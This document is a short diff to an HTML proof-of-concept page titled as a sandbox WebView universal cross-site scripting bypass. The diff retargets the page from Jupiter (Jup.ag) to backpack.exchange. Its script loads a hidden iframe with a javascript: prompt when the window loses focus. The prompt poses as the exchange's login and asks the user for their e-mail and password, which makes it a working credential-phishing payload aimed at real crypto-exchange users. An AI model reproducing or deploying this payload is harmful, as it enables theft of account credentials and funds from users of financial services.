@@ -2,7 +2,7 @@
 <head>
 	<meta charset="UTF-8">
 	<meta name="viewport" content="width=device-width, user-scalable=no">
-	<title> Bypass sandbox Webview UXss Delayed JavaScript execution leak to host app (Jupiter)</title>
+	<title> Bypass sandbox Webview UXss Delayed JavaScript execution leak to host app (backpack.exchange)</title>
 	
 	<style>
     iframe { visibility: hidden; }
@@ -20,7 +20,7 @@
    
 	<script>
 		window.onblur = function() {
-			document.getElementById("iframe").src = "javascript:prompt('In order to access Jup.ag\\nyou must first login on your\\nJupiter Account.\\n\\nPlease type your e-mail\\nand your password:\\n', 'E-mail / Password.');";
+			document.getElementById("iframe").src = "javascript:prompt('In order to access backpack.exchange\\nyou must first login on your\\nBackpack. Account.\\n\\nPlease type your e-mail\\nand your password:\\n', 'E-mail / Password.');";
 		}
 	</script>
 </head>
